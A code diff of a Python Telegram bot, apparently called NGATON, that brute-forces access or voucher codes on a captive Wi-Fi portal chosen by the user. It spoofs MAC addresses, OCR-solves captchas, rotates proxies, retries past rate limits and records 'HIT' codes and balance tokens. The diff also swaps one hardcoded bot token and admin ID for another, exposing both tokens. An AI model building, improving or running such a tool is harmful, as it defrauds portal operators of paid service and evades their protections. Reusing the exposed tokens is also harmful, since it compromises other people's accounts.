@@ -11,7 +11,6 @@
   - "request limited" → retry 5x before give up
   - Balance token extraction from voucher response
   - flush=True everywhere for live debug
-  - Bounded LRU Cache & Safe Telegram Error Handling
 """
 
 import os
@@ -24,7 +23,6 @@ import hashlib
 import asyncio
 import datetime
 import traceback
-from collections import OrderedDict
 from urllib.parse import (
     urljoin, urlparse, parse_qs, urlencode, urlunparse,
 )
@@ -54,7 +52,6 @@ except ImportError:
 
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
-from telegram.error import TelegramError
 from telegram.ext import (
     Application, CommandHandler, MessageHandler,
     CallbackQueryHandler, filters,
@@ -81,8 +78,8 @@ def log(*args, **kwargs):
 #  CONFIG
 # ==============================================================================
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8400956534:AAGhysVeI9CqHJX8wuVrpguWlZPbRu6Q9Eg")
-ADMIN_IDS = [7856294500]
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8922116821:AAGm7DPhoX0hfH-uMxyQf8cjAeNmgh1_6hw")
+ADMIN_IDS = [6051956660]
 CONTACT_USERNAME = "@NgaTON_0"
 CONTACT_LINK = "https://t.me/NgaTON_0"
 
@@ -164,34 +161,13 @@ USER_AGENTS = [
 ]
 
 # ==============================================================================
-#  GLOBAL STATE & BOUNDED CACHE
+#  GLOBAL STATE
 # ==============================================================================
-
-class BoundedCache:
-    def __init__(self, max_size=CAPTCHA_CACHE_SIZE):
-        self.cache = OrderedDict()
-        self.max_size = max_size
-
-    def get(self, key):
-        if key in self.cache:
-            self.cache.move_to_end(key)
-            return self.cache[key]
-        return None
-
-    def set(self, key, value):
-        if key in self.cache:
-            self.cache.move_to_end(key)
-        self.cache[key] = value
-        if len(self.cache) > self.max_size:
-            self.cache.popitem(last=False)
-
-    def __len__(self):
-        return len(self.cache)
 
 _ocr_instance = None
 _proxy_manager: Optional["ProxyManager"] = None
 user_scanners: Dict[int, dict] = {}
-_captcha_cache = BoundedCache(CAPTCHA_CACHE_SIZE)
+_captcha_cache: Dict[str, str] = {}
 _pending_codes: Dict[int, set] = {}
 _state_lock: Optional[asyncio.Lock] = None
 _connector_cache: Dict[str, Any] = {}
@@ -643,7 +619,8 @@ async def solve_captcha_simple_async(session, captcha_url, headers) -> Optional[
         if not text:
             return None
         text = text.strip().upper()
-        _captcha_cache.set(img_hash, text)
+        if len(_captcha_cache) < CAPTCHA_CACHE_SIZE:
+            _captcha_cache[img_hash] = text
         return text
     except Exception:
         return None
@@ -678,6 +655,7 @@ def generate_random_mac() -> str:
 
 
 def replace_mac_urlparse(url: str, new_mac: str) -> str:
+    """ FIXED:  — urlparse + urlencode"""
     try:
         u = urlparse(url)
         query = parse_qs(u.query)
@@ -691,10 +669,15 @@ def replace_mac_urlparse(url: str, new_mac: str) -> str:
 
 
 # ==============================================================================
-#  GATEWAY
+#  GATEWAY —  FIXED: 7.py style 2-GET JS redirect follow + minimal headers
 # ==============================================================================
 
 async def get_sid_from_gateway(session, portal_url):
+    """
+      1. GET spoofed_url (with mac)
+      2. If body has location.href=..., do 2nd GET to follow
+      3. Parse sessionId / sid from final URL query
+    """
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
     }
@@ -845,7 +828,7 @@ def _deep_find_plan(obj, depth=0):
 
 
 # ==============================================================================
-#  BALANCE
+#  BALANCE —  FIXED: use token from voucher response (fallback sid)
 # ==============================================================================
 
 async def fetch_balance_reuse_session(session, active_token, proxy, portal_base):
@@ -904,10 +887,16 @@ async def fetch_balance_reuse_session(session, active_token, proxy, portal_base)
 
 
 # ==============================================================================
-#  CHECKER
+#  CHECKER —  FIXED: "request limited" retry 5x + returns (result, body)
 # ==============================================================================
 
 async def check_single_access_code(session, code, sid, endpoints, proxy):
+    """
+     seven.py style:
+      - Clean referer (no RES, no sessionId)
+      - Retry 5x on "request limited"
+      - Return (result, body)
+    """
     if not sid:
         return "net", None
 
@@ -1011,7 +1000,7 @@ def make_code(mode, counter=None):
 
 
 # ==============================================================================
-#  WORKER
+#  WORKER —  FIXED: sid reuse 30 codes
 # ==============================================================================
 
 async def worker(worker_id, headers_unused, user_id):
@@ -1045,6 +1034,7 @@ async def worker(worker_id, headers_unused, user_id):
             session_codes = 0
 
             while not stop_event.is_set() and session_codes < MAX_CODES_PER_SESSION:
+                #  FIXED: reuse sid until MAX_CODES_PER_SID
                 if sid is None or codes_this_sid >= MAX_CODES_PER_SID:
                     new_sid, _ = await get_sid_from_gateway(session, state["portal_url"])
                     if not new_sid:
@@ -1095,6 +1085,7 @@ async def worker(worker_id, headers_unused, user_id):
                     state["last_hit"] = code
                     state["recent_logs"].append(f"🔥 HIT: {code}")
 
+                    # FIXED: extract token from voucher response
                     active_token = sid
                     if body:
                         m = re.search(r'token=([^&\s"\'<>]+)', body, re.IGNORECASE)
@@ -1232,8 +1223,6 @@ async def live_dashboard_updater(context, user_id):
                     chat_id=user_id, message_id=dash_msg_id,
                     text=text, parse_mode=ParseMode.HTML,
                     reply_markup=markup)
-            except TelegramError:
-                pass
             except Exception:
                 pass
     except asyncio.CancelledError:
@@ -1274,8 +1263,6 @@ async def live_dashboard_updater_final(context, user_id, state):
         await context.bot.edit_message_text(
             chat_id=user_id, message_id=state["dash_msg_id"],
             text=final_text, parse_mode=ParseMode.HTML, reply_markup=markup)
-    except TelegramError:
-        pass
     except Exception:
         pass
 
@@ -1545,3 +1532,270 @@ async def handle_callbacks(update, context, *args, **kwargs):
             await query.edit_message_text("📜 <b>SELECT MODE</b>",
                 parse_mode=ParseMode.HTML, reply_markup=get_mode_menu_markup())
             return
+
+        if data.startswith("set_mode_"):
+            new_mode = data[len("set_mode_"):]
+            context.user_data["selected_mode"] = new_mode
+            mode = new_mode
+            if new_mode == "custom":
+                context.user_data["waiting_for_digit"] = True
+                await query.edit_message_text(
+                    "🔮 <b>CUSTOM MODE</b>\n\nSend starting digit (0-9):",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=get_back_markup("btn_back_mode"))
+                return
+            proxy_line = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
+            await query.edit_message_text(
+                f"✅ Mode Set!\n\n⚡ <b>NGATON</b> ⚡\n\n"
+                f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{proxy_line}",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_main_menu_markup())
+            return
+
+        if data == "btn_update_portal":
+            context.user_data["waiting_for_portal_url"] = True
+            await query.edit_message_text(
+                "🔮 <b>PORTAL BINDING</b>\n\n"
+                "Send target Portal URL.\n\n"
+                "⚠️ <b>URL change → job resets</b>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_back_markup())
+            return
+
+        if data == "btn_mode_menu":
+            await query.edit_message_text("📜 <b>SELECT MODE</b>",
+                parse_mode=ParseMode.HTML, reply_markup=get_mode_menu_markup())
+            return
+
+        if data == "btn_add_proxies":
+            context.user_data["waiting_for_proxy_text"] = True
+            proxy_line = f"👁️ Active: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
+            await query.edit_message_text(
+                "🕷️ <b>PROXY NEXUS</b>\n\n"
+                "Format:\n<code>123.45.67.89:8080</code>\n"
+                "<code>socks5://user:pass@host:1080</code>\n\n"
+                f"{proxy_line}",
+                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
+            return
+
+        if data == "btn_proxy_status":
+            sample = pm.proxies[:5] if pm.proxies else []
+            ss = "\n".join(f"  ▸ <code>{p}</code>" for p in sample) if sample else "  💀 None"
+            ml = "⚡ DIRECT" if active == 0 else f"🕷️ {active}"
+            await query.edit_message_text(
+                f"👁️ <b>PROXY STATUS</b>\n"
+                f"┌───────────────────────┐\n  {ml}\n└───────────────────────┘\n"
+                f"<b>Sample:</b>\n{ss}",
+                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
+            return
+
+        if data == "btn_clear_proxies":
+            try:
+                with open(PROXY_FILE, "w"):
+                    pass
+                pm.proxies = []
+                pm.index = 0
+            except OSError:
+                pass
+            await query.edit_message_text(
+                "🧹 <b>Proxies cleared!</b>",
+                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
+            return
+
+        if data == "btn_start_scanner":
+            await query.edit_message_text("⚡ Starting scanner...")
+            asyncio.create_task(run_user_scanner(context, user_id))
+            return
+
+        if data == "stop_scan":
+            state = user_scanners.get(user_id)
+            if state and not state["stop_event"].is_set():
+                state["stop_event"].set()
+                try:
+                    _flush_pending_codes_sync(user_id)
+                    save_state_now(user_id, state)
+                except Exception:
+                    pass
+                await query.edit_message_text(
+                    "🛑 <b>Scan Stopped</b>\n\n💾 Saved — /start to resume",
+                    parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
+            else:
+                await query.edit_message_text(
+                    "ℹ️ No active scan.",
+                    parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
+            return
+    except Exception as e:
+        log(f"[CB ERR] {type(e).__name__}: {e}")
+
+
+# ==============================================================================
+#  TEXT HANDLER
+# ==============================================================================
+
+async def handle_text(update, context, *args, **kwargs):
+    user_id = update.effective_user.id
+    raw_text = (update.message.text or "").strip()
+    pm = get_proxy_manager()
+    mode = context.user_data.get("selected_mode", "num6")
+
+    try:
+        if context.user_data.get("waiting_for_proxy_text"):
+            context.user_data["waiting_for_proxy_text"] = False
+            lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
+            if not lines:
+                await update.message.reply_text("❌ Empty", reply_markup=get_back_markup())
+                return
+            added, invalid = pm.add_proxies(lines)
+            active = pm.get_active_count()
+            await update.message.reply_text(
+                "✅ <b>Proxies Added</b>\n"
+                "┌───────────────────────┐\n"
+                f"  ➕ Added:   <code>{added}</code>\n"
+                f"  ❌ Invalid: <code>{invalid}</code>\n"
+                f"  ✅ Active:  <code>{active}</code>\n"
+                "└───────────────────────┘",
+                parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
+            return
+
+        if context.user_data.get("waiting_for_portal_url"):
+            context.user_data["waiting_for_portal_url"] = False
+            if not raw_text.lower().startswith(("http://", "https://")):
+                await update.message.reply_text("❌ Invalid URL", reply_markup=get_back_markup())
+                return
+
+            old_url = get_user_portal(user_id)
+            url_changed = (old_url is not None and old_url != raw_text)
+
+            set_user_portal(user_id, raw_text)
+
+            if url_changed:
+                clear_saved_state(user_id)
+                clear_tried_codes(user_id)
+                try:
+                    with open(FILE_PATH, "w"):
+                        pass
+                except Exception:
+                    pass
+                await update.message.reply_text(
+                    "🔄 <b>URL CHANGED</b>\n\n"
+                    "🧹 Previous job cleared\n"
+                    "✅ New Portal saved\n\n"
+                    "⚡ Ready to start fresh",
+                    parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
+            else:
+                active = pm.get_active_count()
+                pl = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
+                await update.message.reply_text(
+                    f"✅ <b>Portal Saved</b>\n\n"
+                    f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{pl}",
+                    parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
+            return
+
+        if context.user_data.get("waiting_for_digit"):
+            context.user_data["waiting_for_digit"] = False
+            if not raw_text.isdigit():
+                await update.message.reply_text("❌ Digits only",
+                    reply_markup=get_back_markup("btn_back_mode"))
+                return
+            context.user_data["start_digit"] = int(raw_text[0])
+            active = pm.get_active_count()
+            pl = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
+            await update.message.reply_text(
+                f"✅ Start Digit = <code>{raw_text[0]}</code>\n\n"
+                f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{pl}",
+                parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
+            return
+
+        saved_url = get_user_portal(user_id)
+        active = pm.get_active_count()
+        text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
+        await update.message.reply_text(
+            text, parse_mode=ParseMode.HTML,
+            reply_markup=get_main_menu_markup())
+    except Exception as e:
+        log(f"[TXT ERR] {type(e).__name__}: {e}")
+
+
+# ==============================================================================
+#  ERROR HANDLER
+# ==============================================================================
+
+async def _error_handler(update, context):
+    err = context.error
+    log(f"[ERROR] {type(err).__name__}: {err}")
+    if err:
+        traceback.print_exception(type(err), err, err.__traceback__)
+
+
+# ==============================================================================
+#  POST INIT
+# ==============================================================================
+
+async def _post_init(application):
+    """Start background tasks after bot initializes"""
+    asyncio.create_task(codes_flusher_loop())
+    asyncio.create_task(state_saver_loop())
+    log(bgreen + "[MAIN] Background tasks started" + reset)
+
+
+# ==============================================================================
+#  MAIN — SIMPLIFIED (Replit-safe, no HTTPXRequest, no close_loop)
+# ==============================================================================
+
+def main():
+    ensure_files_exist()
+
+    log("[MAIN] Building Application...")
+
+    #  FIXED: no HTTPXRequest (Replit crash), post_init wired via builder
+    app = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .post_init(_post_init)
+        .build()
+    )
+
+    log("[MAIN] Application built ✓")
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    app.add_handler(CallbackQueryHandler(handle_callbacks))
+    app.add_error_handler(_error_handler)
+
+    log("[MAIN] Handlers registered ✓")
+
+    pm = get_proxy_manager()
+    log(bgreen + f"[MAIN] Proxies: {pm.get_active_count()}" + reset)
+    log(bgreen + f"[MAIN] ⚡ NUM_WORKERS: {NUM_WORKERS}" + reset)
+    log(bgreen + f"[MAIN] 🔁 MAX_CODES_PER_SID: {MAX_CODES_PER_SID}" + reset)
+    log(bgreen + f"[MAIN] 💾 State: {STATE_FILE}" + reset)
+    log(bgreen + f"[MAIN] 💾 Tried: {TRIED_FILE_TMPL}" + reset)
+    log(bgreen + f"[MAIN] 📝 Hits: {FILE_PATH}" + reset)
+    log(bgreen + f"[MAIN] 🔁 Resume: ON" + reset)
+    log(bgreen + f"[MAIN] 🛑 /stop: ON" + reset)
+    log("[MAIN] Starting Telegram polling...", flush=True)
+
+    #  Simple polling — no close_loop, no HTTPXRequest
+    app.run_polling(
+        drop_pending_updates=True,
+        allowed_updates=None,
+    )
+
+    log(f"See you — {CONTACT_USERNAME}")
+
+
+# ==============================================================================
+#  ENTRY POINT
+# ==============================================================================
+
+if __name__ == "__main__":
+    try:
+        show_banner()
+        _proxy_manager = get_proxy_manager()
+        main()
+    except KeyboardInterrupt:
+        log(yellow + "\n[MAIN] Stopped by user" + reset)
+    except BaseException as e:
+        log(bred + f"\n[FATAL] {type(e).__name__}: {e}" + reset)
+        traceback.print_exc()
